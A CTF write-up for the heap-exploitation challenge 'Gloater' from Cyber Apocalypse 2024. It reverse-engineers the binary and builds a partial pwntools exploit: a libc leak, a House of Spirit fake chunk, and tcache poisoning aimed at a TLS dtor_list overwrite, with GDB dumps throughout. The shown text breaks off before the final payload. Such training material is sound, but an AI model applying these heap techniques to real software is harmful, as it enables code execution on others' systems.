---
title: "Gloater - Cyber Apocalypse 2024: Hacker Royale"
category: "pwn"
subcategory: "heap"
type: "writeup"
tags: ["pwn", "heap", "canary", "pie", "ghidra", "memcpy", "scanf", "cyber-apocalypse-2024-hacker-r", "cyber-apocalypse-2024-hacker-royal", "2024", "ctf-writeup"]
summary: "Linux Exploitation Expert - HackTricks Training"
source:
  name: "CTFtime writeup #39001"
  url: "https://ctftime.org/writeup/39001"
original_source: "https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/"
ctf:
  name: "Cyber Apocalypse 2024: Hacker Royale"
  year: 2024
  challenge: "Gloater"
---

## Metadata

- **CTF:** Cyber Apocalypse 2024: Hacker Royale
- **Task:** Gloater
- **Author team:** Watch4Hack
- **CTFtime:** <https://ctftime.org/writeup/39001>
- **Original writeup:** <https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/>

---
![Linux Exploitation Expert](https://7rocky.github.io/images/LEE.png)

Linux Exploitation Expert — HackTricks Training

Progress from binary exploitation fundamentals to advanced exploit development in Linux across user space, heap, ARM, kernel, and browser targets.

[View Course](https://hacktricks-training.com/courses/lee/) ×

We are given a 64-bit binary called `gloater`:

`

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

`

We are also given a `Dockerfile` with the container configuration:

`

```
    FROM ubuntu:20.04
    ENV DEBIAN_FRONTEND noninteractive
    
    RUN apt-get update --fix-missing && apt-get -y upgrade
    RUN apt-get install -y socat
    
    RUN useradd -m ctf
    
    COPY challenge/* /home/ctf/
    
    RUN chown -R ctf:ctf /home/ctf/
    
    WORKDIR /home/ctf
    #USER ctf
    
    EXPOSE 9001
    CMD ["./run.sh"]
```

`

We can see that the program is running on Ubuntu 20.04, so it will use Glibc 2.31. We can launch the container and take `libc.so.6` from inside:

`

```
    $ docker build --tag=gloater .
    [+] Building 5.3s (12/12) FINISHED                                                                                                             docker:default
     => [internal] load build definition from Dockerfile                                                                                                     0.0s
     => => transferring dockerfile: 318B                                                                                                                     0.0s
     => [internal] load metadata for docker.io/library/ubuntu:20.04                                                                                          0.7s
     => [internal] load .dockerignore                                                                                                                        0.0s
     => => transferring context: 2B                                                                                                                          0.0s
     => [1/7] FROM docker.io/library/ubuntu:20.04@sha256:80ef4a44043dec4490506e6cc4289eeda2d106a70148b74b5ae91ee670e9c35d                                    0.0s
     => [internal] load build context                                                                                                                        0.0s
     => => transferring context: 21.86kB                                                                                                                     0.0s
     => CACHED [2/7] RUN apt-get update --fix-missing && apt-get -y upgrade                                                                                  0.0s
     => [3/7] RUN apt-get install -y socat                                                                                                                   3.7s
     => [4/7] RUN useradd -m ctf                                                                                                                             0.4s
     => [5/7] COPY challenge/* /home/ctf/                                                                                                                    0.0s
     => [6/7] RUN chown -R ctf:ctf /home/ctf/                                                                                                                0.3s
     => [7/7] WORKDIR /home/ctf                                                                                                                              0.1s
     => exporting to image                                                                                                                                   0.1s
     => => exporting layers                                                                                                                                  0.1s
     => => writing image sha256:160391a668cdd71f3c4d464f323b68fa8fe51ff1e6582ac20971348e7daeb079                                                             0.0s
     => => naming to docker.io/library/gloater                                                                                                               0.0s
    
    $ docker run -it -p 9001:9001 --rm --name=gloater -d gloater
    4f9e9d6840a1026b36dea1ba4575be9baa8f22edc051f52b5ba2180bca2cc0a8
    
    $ docker cp -L 4f9e9d68:/lib/x86_64-linux-gnu/libc.so.6 .
    Successfully copied 2.03MB to ./.
```

`

## Reverse engineering

We can use Ghidra to analyze the binary and look at the decompiled source code in C. This is `main`:

`

```
    void main() {
      int option;
      char stack_buffer[136];
    
      setup();
      libc_start = 0x92e50;
      libc_end = 0x268e50;
    
      printf("Enter User\nDo not make a mistake, or there will be no safeguard!\n> ");
      read(0, user, 0x10);
    
      option = 0;
    
      do {
        printf("1) Update current user\n2) Create new taunt\n3) Remove taunt\n4) Send all taunts\n5) Set Super Taunt\n6) Exit\n> ");
        __isoc99_scanf("%d", &option);
        switch (option) {
        default:
                        // WARNING: Subroutine does not return
          exit(0);
        case 1:
          change_user();
          break;
        case 2:
          create_taunt();
          break;
        case 3:
          remove_taunt();
          break;
        case 4:
          send_taunts();
          break;
        case 5:
          set_super_taunt(stack_buffer);
        }
      } while (true);
    }
```

`

Basically, it prompts a typical menu from a heap exploitation challenge (after setting a username):

`

```
    $ nc 127.0.0.1 9001
    Enter User
    Do not make a mistake, or there will be no safeguard!
    > asdf
    1) Update current user
    2) Create new taunt
    3) Remove taunt
    4) Send all taunts
    5) Set Super Taunt
    6) Exit
    >
```

`

### Allocation function

This is `create_taunt` (option `2`):

`

```
    void create_taunt() {
      int ret;
      ssize_t length;
      char *p_taunt;
      long c;
      undefined taunt[1028];
      int _length;
      taunt_t *p_taunt_struct;
      
      if (taunt_count < 8) {
        p_taunt_struct = (taunt_t *) malloc(0x28);
        memset(p_taunt_struct, 0, 0x28);
        printf("Taunt target: ");
        read(0, p_taunt_struct->target, 0x1f);
        ret = strcmp(p_taunt_struct->target, user);
    
        if (ret == 0) {
          puts("DANGER: You entered yourself");
          puts("Bet you\'re glad you paid attention initially, eh?");
          puts("Next time, you won\'t be so lucky.");
        } else {
          memset(taunt, 0, 1024);
          printf("Taunt: ");
          length = read(0, taunt, 1023);
          _length = (int) length;
          p_taunt = (char *) malloc((long) _length);
          p_taunt_struct->taunt = p_taunt;
          memset(p_taunt_struct, 0, 0x10);
          memcpy(p_taunt_struct->taunt, taunt, (long) _length);
          c = (long) taunt_count;
          taunt_count = taunt_count + 1;
          taunts[c] = p_taunt_struct;
        }
      } else {
        puts("Cannot taunt more. You must risk it again.");
      }
    }
```

`

To enhance readibility, I configured the following `struct` after understanding the fields that are read by the program:

`

```
    typedef struct {
        char target[0x20];  
        char* taunt;
    } taunt_t;
```

`

Basically, this function allocates a `0x31`-sized chunk, and we can enter up to `0x1f` as the target. If that value coincides with the username from the beginning, the function returns. Otherwise, we are allowed to enter up to `1023` bytes as a taunt, and it will be placed on a chunk whose size is determined by the length of our input data.

Moreover, the pointer to the `struct` will ve saved in a global array `taunts`, whose size is 8. We cannot choose the index to store the taunt on the array.

### Free function

Here we have `remove_taunt` (option `3`):

`

```
    void remove_taunt() {
      int index;
      taunt_t *p_taunt;
      
      printf("Index: ");
      __isoc99_scanf("%d", &index);
    
      if ((index < 0) || (taunt_count <= index)) {
        puts("Invalid Index");
      } else if (taunts[index] == NULL) {
        puts("Taunt already removed");
      } else {
        p_taunt = taunts[index];
        free(p_taunt->taunt);
        free(p_taunt);
        taunts[index] = NULL;
        puts("Taunt removed");
      }
    }
```

`

This function is simple: we provide an index (checked to be in-bounds), and the function will use `free` on both the `struct` and the taunt buffer. Next, it updates the global array with a `NULL` value. Perhaps, the only weird thing is that the number of taunts is not decreased. As a result, we can only use `create_taunt` a total of 8 times.

Related to this function, we have option `4`, which is `send_taunts`:

`

```
    void send_taunts() {
      int i;
      
      puts("Taunting...");
      for (i = 0; i < taunt_count; i = i + 1) {
        free(taunts[i]->taunt);
        free(taunts[i]);
        taunts[i] = NULL;
      }
                        // WARNING: Subroutine does not return
      exit(0);
    }
```

`

This function is quite useless, because it simply uses `free` on all taunts and finally exits the program.

### Other functions

This is `set_super_taunt` (option `5`):

`

```
    void set_super_taunt(void *stack_buffer) {
      ssize_t length;
      int index;
      int _length;
      
      if (super_taunt_set == 0) {
        printf("Index for Super Taunt: ");
        __isoc99_scanf("%d", &index);
    
        if ((index < 0) || (taunt_count <= index)) {
          puts("Error: Invalid Index");
        } else if (taunts[index] == NULL) {
          puts("Taunt was removed...");
        } else {
          super_taunt = taunts[index];
          printf("Plague to accompany the super taunt: ");
          length = read(0, stack_buffer, 136);
          _length = (int) length;
          printf("Plague entered: %s\n", stack_buffer);
          super_taunt_plague = stack_buffer;
          puts("Registered");
          super_taunt_set = 1;
        }
      } else {
        puts("Super Taunt already set.");
      }
    }
```

`

This one is a bit weird. It takes an existing taunt, but it never uses it. Moreover, the function receives a stack buffer from `main`, which is used to read from `stdin`. Then, it prints out the buffer that has just been written. Finally, it sets global variables `super_taunt_plague` and `super_taunt_set`.

The only reason of this function is to provide the ability to leak pointers, because the stack buffer is not cleared before writing, and there is no null byte at the end of our input data.

Option `1` allows us to change our username, which can be done only one time:

`

```
    void change_user() {
      ssize_t length;
      char new_user[20];
      int _length;
      int i;
      int found_space;
      
      if (user_changed != 0) {
        puts("You have already changed the User. There is only one life.");
                        // WARNING: Subroutine does not return
        exit(0);
      }
    
      puts("Setting the User is a safeguard against getting destroyed");
      printf("New User: ");
      length = read(0, new_user, 0x10);
      _length = (int) length;
      found_space = 1;
      i = 0;
    
      do {
        if (15 < i) {
    LAB_00101446:
          printf("Old User was %s...\n", user);
    
          if (found_space != 0) {
            user._0_8_ = 0x4620524559414c50;
            user._8_8_ = 0x20454854204d4f52;
            super_taunt_plague = 0x4c4e4f4954434146;
            _DAT_00104118 = 0x20535345;
            DAT_0010411c = 0;
            strncpy(&DAT_0010411c, new_user, (long) _length);
          }
    
          puts("Updated");
          user_changed = 1;
          return;
        }
    
        if (new_user[i] == ' ') {
          found_space = 0;
          goto LAB_00101446;
        }
    
        i++;
      } while (true);
    }
```

`

Again, the way this function is written is weird. At the bottom, there is a `do`-`while` loop that analyzes the information at `new_user`, and then overwrites it with `"PLAYER FROM THE FACTIONLESS \0"` concatenated with the contents of `new_user`.

With this, we have an out-of-bounds write, because `user` is a global variable which has only 16 bytes reserved. After this variable, we have the global array `super_taunt_plague` and `taunts`:

`

```
                            user
            00104100 00              undefined100h                     [0]
            00104101 00              undefined100h                     [1]
            00104102 00              undefined100h                     [2]
            00104103 00              undefined100h                     [3]
            00104104 00              undefined100h                     [4]
            00104105 00              undefined100h                     [5]
            00104106 00              undefined100h                     [6]
            00104107 00              undefined100h                     [7]
            00104108 00              undefined100h                     [8]
            00104109 00              undefined100h                     [9]
            0010410a 00              undefined100h                     [10]
            0010410b 00              undefined100h                     [11]
            0010410c 00              undefined100h                     [12]
            0010410d 00              undefined100h                     [13]
            0010410e 00              undefined100h                     [14]
            0010410f 00              undefined100h                     [15]
    
                            super_taunt_plague
    00104110 00 00 00        undefined8 0000000000000000h
                    00 00 00
                    00 00
    
                            DAT_00104118
    00104118 00              ??         00h
    00104119 00              ??         00h
    0010411a 00              ??         00h
    0010411b 00              ??         00h
    
                            DAT_0010411c
    0010411c 00              ??         00h
    0010411d 00              ??         00h
    0010411e 00              ??         00h
    0010411f 00              ??         00h
    
                            taunts
            00104120 00 00 00 00 00  taunt_t * 00000000                [0]
                    00 00 00
            00104128 00 00 00 00 00  taunt_t * 00000000                [1]
                    00 00 00
            00104130 00 00 00 00 00  taunt_t * 00000000                [2]
                    00 00 00
            00104138 00 00 00 00 00  taunt_t * 00000000                [3]
                    00 00 00
            00104140 00 00 00 00 00  taunt_t * 00000000                [4]
                    00 00 00
            00104148 00 00 00 00 00  taunt_t * 00000000                [5]
                    00 00 00
            00104150 00 00 00 00 00  taunt_t * 00000000                [6]
                    00 00 00
            00104158 00 00 00 00 00  taunt_t * 00000000                [7]
                    00 00 00
    
                            super_taunt
    00104160 00 00 00        undefined8 0000000000000000h
                    00 00 00
                    00 00
                            taunt_count
    00104168 00 00 00 00     undefined4 00000000h
    0010416c 00              ??         00h
    0010416d 00              ??         00h
    0010416e 00              ??         00h
    0010416f 00              ??         00h
```

`

As you can see, the contents of `new_user` are put at `DAT_0010411c` (4 bytes), so we can easily corrupt the first pointer of `taunts`.

Last but not least, this is `setup`:

`

```
    void setup() {
      setvbuf(stdin, NULL, 2, 0);
      setvbuf(stdout, NULL, 2, 0);
      setvbuf(stderr, NULL, 2, 0);
      alarm(0x7f);
      old_malloc_hook = __malloc_hook;
      __malloc_hook = my_malloc_hook;
      old_free_hook = __free_hook;
      __free_hook = my_free_hook;
    }
```

`

Apart from setting buffering configurations in `stdin`, `stdout` and `stderr`, it sets `__malloc_hook` and `__free_hook` to two custom functions:

`

```
    void * my_malloc_hook(size_t param_1) {
      void *ptr;
      
      __malloc_hook = (code *) old_malloc_hook;
      __free_hook = (code *) old_free_hook;
      ptr = malloc(param_1);
      old_malloc_hook = __malloc_hook;
      old_free_hook = __free_hook;
      validate_ptr(ptr);
      __malloc_hook = my_malloc_hook;
      __free_hook = my_free_hook;
    
      return ptr;
    }
    
    
    void my_free_hook(void *param_1) {
      __malloc_hook = (code *) old_malloc_hook;
      __free_hook = (code *) old_free_hook;
      validate_ptr(param_1);
      free(param_1);
      old_malloc_hook = __malloc_hook;
      old_free_hook = __free_hook;
      __malloc_hook = my_malloc_hook;
      __free_hook = my_free_hook;
    }
```

`

These functions are just to prevent us from modifying the hooks to achieve arbitrary code execution (as usual in heap exploitation challenges). Moreover, we have a `validate_ptr` function that won’t allow us allocating a chunk or freeing a chunk inside Glibc:

`

```
    void validate_ptr(void *ptr) {
      if ((libc_start <= ptr) && (ptr <= libc_end)) {
        puts("Did you really think?");
                        // WARNING: Subroutine does not return
        exit(-1);
      }
    }
```

`

## Exploit strategy

The first thing we can do is leak Glibc using `set_super_taunt` (we could have also leaked some binary addresses to bypass PIE, but Glibc is much more powerful).

After that, we can use `change_name` to corrupt the `taunts` global array and modify the first pointer (we can simply modify the least significant byte). With this, we can get an arbitrary `free`. For instance, we can forge a chunk inside a `taunt_t` buffer and call `free` on it (House of Spirit). As a result, we will be able to allocate again and get an overlapping chunks situation, where we can just modify an `fd` pointer of a freed chunk to perform a Tcache poisoning attack and get an arbitrary write primitive.

Once we have an arbitrary write primitive, we can use [TLS-storage `dtor_list`](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#5---code-execution-via-tls-storage-dtor_list-overwrite), which I used before on [Zombiedote](https://7rocky.github.io/en/ctf/other/htb-unictf/zombiedote).

## Exploit development

We will use the following helper functions:

`

```
    def update_current_user(username: bytes) -> bytes:
        io.sendlineafter(b'> ', b'1')
        io.sendafter(b'New User: ', username)
        return io.recvuntil(b'\nUpdated', drop=True)
    
    
    def create_new_taunt(target: bytes, taunt: bytes):
        io.sendlineafter(b'> ', b'2')
        io.sendafter(b'Taunt target: ', target)
        io.sendafter(b'Taunt: ', taunt)
    
    
    def remove_taunt(index: int):
        io.sendlineafter(b'> ', b'3')
        io.sendlineafter(b'Index: ', str(index).encode())
    
    
    def set_super_taunt(index: int, plague: bytes) -> bytes:
        io.sendlineafter(b'> ', b'5')
        io.sendlineafter(b'Index for Super Taunt: ', str(index).encode())
        io.sendafter(b'Plague to accompany the super taunt: ', plague)
        io.recvuntil(b'Plague entered: ')
        return io.recvuntil(b'\nRegistered', drop=True)
```

`

We will use the following heap layout for later use:

`

```
    def main():
        io.sendlineafter(b'> ', b'asdf')
    
        create_new_taunt(b'qwer', p64(0) + p64(0x181) + b'A' * 0x20 + p64(0)) 
        create_new_taunt(b'A' * 8, b'B' * 0x118) 
        create_new_taunt(b'A' * 8, b'B' * 0x118) 
```

`

The size of the chunks are quite arbitrary. I started with `0x18`, but then I needed more size for the arbitrary write, so I simply added `0x100`, which was easy.

We can launch the exploit and then attach to the process running on the Docker container using GDB:

`

```
    $ gdb -q -p $(pidof gloater)
    Attaching to process 327587
    Reading symbols from target:/home/ctf/gloater...
    (No debugging symbols found in target:/home/ctf/gloater)
    Reading symbols from target:/lib/x86_64-linux-gnu/libc.so.6...
    (No debugging symbols found in target:/lib/x86_64-linux-gnu/libc.so.6)
    Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
    (No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
    
    warning: Target and debugger are in different PID namespaces; thread lists and other data are likely unreliable.  Connect to gdbserver inside the container.
    0x00007f443d19c1f2 in read () from target:/lib/x86_64-linux-gnu/libc.so.6
```

`

`

```
    gef> vmmap heap
    [ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
    Start              End                Size               Offset             Perm Path
    0x000056372a0c0000 0x000056372a0e1000 0x0000000000021000 0x0000000000000000 rw- [heap]
    gef> x/300gx 0x000056372a0c0290
    0x56372a0c0290: 0x0000000000000000      0x0000000000000031
    0x56372a0c02a0: 0x0000000000000000      0x0000000000000000
    0x56372a0c02b0: 0x0000000000000000      0x0000000000000000
    0x56372a0c02c0: 0x000056372a0c02d0      0x0000000000000041
    0x56372a0c02d0: 0x0000000000000000      0x0000000000000181
    0x56372a0c02e0: 0x4141414141414141      0x4141414141414141
    0x56372a0c02f0: 0x4141414141414141      0x4141414141414141
    0x56372a0c0300: 0x0000000000000000      0x0000000000000031
    0x56372a0c0310: 0x0000000000000000      0x0000000000000000
    0x56372a0c0320: 0x0000000000000000      0x0000000000000000
    0x56372a0c0330: 0x000056372a0c0340      0x0000000000000121
    0x56372a0c0340: 0x4242424242424242      0x4242424242424242
    0x56372a0c0350: 0x4242424242424242      0x4242424242424242
    0x56372a0c0360: 0x4242424242424242      0x4242424242424242
    0x56372a0c0370: 0x4242424242424242      0x4242424242424242
    0x56372a0c0380: 0x4242424242424242      0x4242424242424242
    0x56372a0c0390: 0x4242424242424242      0x4242424242424242
    0x56372a0c03a0: 0x4242424242424242      0x4242424242424242
    0x56372a0c03b0: 0x4242424242424242      0x4242424242424242
    0x56372a0c03c0: 0x4242424242424242      0x4242424242424242
    0x56372a0c03d0: 0x4242424242424242      0x4242424242424242
    0x56372a0c03e0: 0x4242424242424242      0x4242424242424242
    0x56372a0c03f0: 0x4242424242424242      0x4242424242424242
    0x56372a0c0400: 0x4242424242424242      0x4242424242424242
    0x56372a0c0410: 0x4242424242424242      0x4242424242424242
    0x56372a0c0420: 0x4242424242424242      0x4242424242424242
    0x56372a0c0430: 0x4242424242424242      0x4242424242424242
    0x56372a0c0440: 0x4242424242424242      0x4242424242424242
    0x56372a0c0450: 0x4242424242424242      0x0000000000000031
    0x56372a0c0460: 0x0000000000000000      0x0000000000000000
    0x56372a0c0470: 0x0000000000000000      0x0000000000000000
    0x56372a0c0480: 0x000056372a0c0490      0x0000000000000121
    0x56372a0c0490: 0x4242424242424242      0x4242424242424242
    0x56372a0c04a0: 0x4242424242424242      0x4242424242424242
    0x56372a0c04b0: 0x4242424242424242      0x4242424242424242
    0x56372a0c04c0: 0x4242424242424242      0x4242424242424242
    0x56372a0c04d0: 0x4242424242424242      0x4242424242424242
    0x56372a0c04e0: 0x4242424242424242      0x4242424242424242
    0x56372a0c04f0: 0x4242424242424242      0x4242424242424242
    0x56372a0c0500: 0x4242424242424242      0x4242424242424242
    0x56372a0c0510: 0x4242424242424242      0x4242424242424242
    0x56372a0c0520: 0x4242424242424242      0x4242424242424242
    0x56372a0c0530: 0x4242424242424242      0x4242424242424242
    0x56372a0c0540: 0x4242424242424242      0x4242424242424242
    0x56372a0c0550: 0x4242424242424242      0x4242424242424242
    0x56372a0c0560: 0x4242424242424242      0x4242424242424242
    0x56372a0c0570: 0x4242424242424242      0x4242424242424242
    0x56372a0c0580: 0x4242424242424242      0x4242424242424242
    0x56372a0c0590: 0x4242424242424242      0x4242424242424242
    0x56372a0c05a0: 0x4242424242424242      0x0000000000020a61
    ...
```

`

As can be seen, we have several chunks:

  * 3 chunks for `taunt_t` structures
  * 2 `0x121`-sized chunks
  * One `0x41` size chunk (`0x56372a0c02d0`) which has inside a fake `0x181`-sized chunk (`0x56372a0c02e0`)


Now that we have some taunts set, we can use `set_super_taunt` to leak memory addresses:

`

```
    gef> break *set_super_taunt+228
    Breakpoint 1 at 0x5637292f48aa
    gef> x/i *set_super_taunt+228
       0x5637292f48aa <set_super_taunt+228>:        call   0x5637292f4080 <read@plt>
    gef> continue
    Continuing.
```

`

We have these values on the stack buffer, previous to the `read` instruction:

`

```
    gef> x/40gx $rsi
    0x7ffcb59078f0: 0x0000000000000000      0x0000000000000000
    0x7ffcb5907900: 0x0000000000000000      0x0000000000000000
    0x7ffcb5907910: 0x0000000000000000      0x0000000000009205
    0x7ffcb5907920: 0x00005637292f3040      0x000000000000000b
    0x7ffcb5907930: 0x00007ffcb59079a0      0x00007ffcb5907c59
    0x7ffcb5907940: 0x00007f443d2865e0      0x00005637292f4a85
    0x7ffcb5907950: 0x00007f443d27f2e8      0x00005637292f4a40
    0x7ffcb5907960: 0x0000000000000000      0x00005637292f4100
    0x7ffcb5907970: 0x00007ffcb5907a70      0x00007f443d112420
    0x7ffcb5907980: 0x0000000000000000      0x00007f443d0b2083
    0x7ffcb5907990: 0x0000000000000031      0x00007ffcb5907a78
    0x7ffcb59079a0: 0x000000013d2767a0      0x00005637292f4288
    0x7ffcb59079b0: 0x00005637292f4a40      0xc2a5b79a4e2fcd4f
    0x7ffcb59079c0: 0x00005637292f4100      0x00007ffcb5907a70
    0x7ffcb59079d0: 0x0000000000000000      0x0000000000000000
    0x7ffcb59079e0: 0x3d5cdcbabd0fcd4f      0x3c2dcd8c0e41cd4f
    0x7ffcb59079f0: 0x0000000000000000      0x0000000000000000
    0x7ffcb5907a00: 0x0000000000000000      0x0000000000000001
    0x7ffcb5907a10: 0x00007ffcb5907a78      0x00007ffcb5907a88
    0x7ffcb5907a20: 0x00007f443d2b3190      0x0000000000000000
```

`

Notice that at offset 136 we have `puts`:

`

```
    gef> x/gx $rsi+136
    0x7ffcb5907978: 0x00007f443d112420
    gef> x 0x00007f443d112420
    0x7f443d112420 <puts>:  0x55415641fa1e0ff3
    gef> continue
    Continuing.
```

`

Further, the maximum amount of data we can enter is 136, so this is perfect:

`

```
        glibc.address = u64(set_super_taunt(0, b'A' * 136)[136:].ljust(8, b'\0')) - glibc.sym.puts
        tls_addr = glibc.address + 0x1f3540
        io.success(f'Glibc base address: {hex(glibc.address)}')
```

`

With this, we have the base address of Glibc:

`

```
    [+] Glibc base address: 0x7f443d08e000
```

`

Now, we are going to corrupt `taunts[0]`, which is near to `user`:

`

```
    gef> x/s &user
    0x5637292f7100 <user>:  "asdf\n"
    gef> x/20gx &user
    0x5637292f7100 <user>:  0x0000000a66647361      0x0000000000000000
    0x5637292f7110 <super_taunt_plague>:    0x00007ffcb59078f0      0x0000000000000000
    0x5637292f7120 <taunts>:        0x000056372a0c02a0      0x000056372a0c0310
    0x5637292f7130 <taunts+16>:     0x000056372a0c0460      0x0000000000000000
    0x5637292f7140 <taunts+32>:     0x0000000000000000      0x0000000000000000
    0x5637292f7150 <taunts+48>:     0x0000000000000000      0x0000000000000000
    0x5637292f7160 <super_taunt>:   0x000056372a0c02a0      0x0000000000000003
    0x5637292f7170 <libc_start>:    0x00007f443d0a01f0      0x00007f443d2761f0
    0x5637292f7180 <user_changed>:  0x0000000100000000      0x0000000000000000
    0x5637292f7190 <old_free_hook>: 0x0000000000000000      0x0000000000000000
    gef> continue
    Continuing.
```

`

We will modify the last byte (`0xa0`) to `0xe0`, so that `taunt[0]` points to our fake chunk of size `0x181`:

`

```
        update_current_user(b'A' * 4 + b'\xe0')
```

`

After this, we have:

`

```
    gef> x/20gx &user
    0x5637292f7100 <user>:  0x4620524559414c50      0x20454854204d4f52
    0x5637292f7110 <super_taunt_plague>:    0x4c4e4f4954434146      0x4141414120535345
    0x5637292f7120 <taunts>:        0x000056372a0c02e0      0x000056372a0c0310
    0x5637292f7130 <taunts+16>:     0x000056372a0c0460      0x0000000000000000
    0x5637292f7140 <taunts+32>:     0x0000000000000000      0x0000000000000000
    0x5637292f7150 <taunts+48>:     0x0000000000000000      0x0000000000000000
    0x5637292f7160 <super_taunt>:   0x000056372a0c02a0      0x0000000000000003
    0x5637292f7170 <libc_start>:    0x00007f443d0a01f0      0x00007f443d2761f0
    0x5637292f7180 <user_changed>:  0x0000000100000001      0x0000000000000000
    0x5637292f7190 <old_free_hook>: 0x0000000000000000      0x0000000000000000
    gef> x/20gx 0x000056372a0c02e0 - 0x10
    0x56372a0c02d0: 0x0000000000000000      0x0000000000000181
    0x56372a0c02e0: 0x4141414141414141      0x4141414141414141
    0x56372a0c02f0: 0x4141414141414141      0x4141414141414141
    0x56372a0c0300: 0x0000000000000000      0x0000000000000031
    0x56372a0c0310: 0x0000000000000000      0x0000000000000000
    0x56372a0c0320: 0x0000000000000000      0x0000000000000000
    0x56372a0c0330: 0x000056372a0c0340      0x0000000000000121
    0x56372a0c0340: 0x4242424242424242      0x4242424242424242
    0x56372a0c0350: 0x4242424242424242      0x4242424242424242
    0x56372a0c0360: 0x4242424242424242      0x4242424242424242
```

`

Next, we will free this fake chunk, and also chunks `2` and `1`:

`

```
        remove_taunt(0)
        remove_taunt(2)
        remove_taunt(1)
```

`

The heap is like this at this moment:

`

```
    gef> x/300gx 0x000056372a0c0290
    0x56372a0c0290: 0x0000000000000000      0x0000000000000031
    0x56372a0c02a0: 0x0000000000000000      0x0000000000000000
    0x56372a0c02b0: 0x0000000000000000      0x0000000000000000
    0x56372a0c02c0: 0x000056372a0c02d0      0x0000000000000041
    0x56372a0c02d0: 0x0000000000000000      0x0000000000000181
    0x56372a0c02e0: 0x0000000000000000      0x000056372a0c0010
    0x56372a0c02f0: 0x4141414141414141      0x4141414141414141
    0x56372a0c0300: 0x0000000000000000      0x0000000000000031
    0x56372a0c0310: 0x000056372a0c0460      0x000056372a0c0010
    0x56372a0c0320: 0x0000000000000000      0x0000000000000000
    0x56372a0c0330: 0x000056372a0c0340      0x0000000000000121
    0x56372a0c0340: 0x000056372a0c0490      0x000056372a0c0010
    0x56372a0c0350: 0x4242424242424242      0x4242424242424242
    0x56372a0c0360: 0x4242424242424242      0x4242424242424242
    0x56372a0c0370: 0x4242424242424242      0x4242424242424242
    0x56372a0c0380: 0x4242424242424242      0x4242424242424242
    0x56372a0c0390: 0x4242424242424242      0x4242424242424242
    0x56372a0c03a0: 0x4242424242424242      0x4242424242424242
    0x56372a0c03b0: 0x4242424242424242      0x4242424242424242
    0x56372a0c03c0: 0x4242424242424242      0x4242424242424242
    0x56372a0c03d0: 0x4242424242424242      0x4242424242424242
    0x56372a0c03e0: 0x4242424242424242      0x4242424242424242
    0x56372a0c03f0: 0x4242424242424242      0x4242424242424242
    0x56372a0c0400: 0x4242424242424242      0x4242424242424242
    0x56372a0c0410: 0x4242424242424242      0x4242424242424242
    0x56372a0c0420: 0x4242424242424242      0x4242424242424242
    0x56372a0c0430: 0x4242424242424242      0x4242424242424242
    0x56372a0c0440: 0x4242424242424242      0x4242424242424242
    0x56372a0c0450: 0x4242424242424242      0x0000000000000031
    0x56372a0c0460: 0x0000000000000000      0x000056372a0c0010
    0x56372a0c0470: 0x0000000000000000      0x0000000000000000
    0x56372a0c0480: 0x000056372a0c0490      0x0000000000000121
    0x56372a0c0490: 0x0000000000000000      0x000056372a0c0010
    0x56372a0c04a0: 0x4242424242424242      0x4242424242424242
    0x56372a0c04b0: 0x4242424242424242      0x4242424242424242
    0x56372a0c04c0: 0x4242424242424242      0x4242424242424242
    0x56372a0c04d0: 0x4242424242424242      0x4242424242424242
    0x56372a0c04e0: 0x4242424242424242      0x4242424242424242
    0x56372a0c04f0: 0x4242424242424242      0x4242424242424242
    0x56372a0c0500: 0x4242424242424242      0x4242424242424242
    0x56372a0c0510: 0x4242424242424242      0x4242424242424242
    0x56372a0c0520: 0x4242424242424242      0x4242424242424242
    0x56372a0c0530: 0x4242424242424242      0x4242424242424242
    0x56372a0c0540: 0x4242424242424242      0x4242424242424242
    0x56372a0c0550: 0x4242424242424242      0x4242424242424242
    0x56372a0c0560: 0x4242424242424242      0x4242424242424242
    0x56372a0c0570: 0x4242424242424242      0x4242424242424242
    0x56372a0c0580: 0x4242424242424242      0x4242424242424242
    0x56372a0c0590: 0x4242424242424242      0x4242424242424242
    0x56372a0c05a0: 0x4242424242424242      0x0000000000020a61
    ...
```

`

At this point, if we allocate a `0x181`-sized chunk, we will be able to overlap with the `0x121`-sized chunk that’s below and modify the `fd` pointer to perform a simple Tcache poisoning attack:

`

```
        create_new_taunt(b'C' * 8, (b'D' * 40 + p64(0x31) + b'A' * 40 + p64(0x121) + p64(tls_addr - 0x80 + 0x28)).ljust(0x178, b'A'))
```

`

We will enter an address of the TLS to perform [TLS-storage `dtor_list`](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#5---code-execution-via-tls-storage-dtor_list-overwrite). The offset to address can be found in GDB, based on Glibc:

`

```
    gef> tls
    $tls = 0x7f443d281540
    ------------------------------------------------------------------------------------ TLS-0x80 ------------------------------------------------------------------------------------
    0x7f443d2814c0|+0x0000|+000: 0x0000000000000000
    0x7f443d2814c8|+0x0008|+001: 0x00007f443d2294c0  ->  0x0000000100000000
    0x7f443d2814d0|+0x0010|+002: 0x00007f443d229ac0  ->  0x0000000100000000
    0x7f443d2814d8|+0x0018|+003: 0x00007f443d22a3c0  ->  0x0002000200020002
    0x7f443d2814e0|+0x0020|+004: 0x0000000000000000
    0x7f443d2814e8|+0x0028|+005: 0x0000000000000000
    0x7f443d2814f0|+0x0030|+006: 0x000056372a0c0010  ->  0x0000000000020000
    0x7f443d2814f8|+0x0038|+007: 0x0000000000000000
    0x7f443d281500|+0x0040|+008: 0x00007f443d27ab80  ->  0x0000000000000000
    0x7f443d281508|+0x0048|+009: 0x0000000000000000
    0x7f443d281510|+0x0050|+010: 0x0000000000000000
    0x7f443d281518|+0x0058|+011: 0x0000000000000000
    0x7f443d281520|+0x0060|+012: 0x0000000000000000
    0x7f443d281528|+0x0068|+013: 0x0000000000000000
    0x7f443d281530|+0x0070|+014: 0x0000000000000000
    0x7f443d281538|+0x0078|+015: 0x0000000000000000
    -------------------------------------------------------------------------------------- TLS --------------------------------------------------------------------------------------
    0x7f443d281540|+0x0000|+000: 0x00007f443d281540  ->  [loop detected]
    0x7f443d281548|+0x0008|+001: 0x00007f443d281ea0  ->  0x0000000000000001
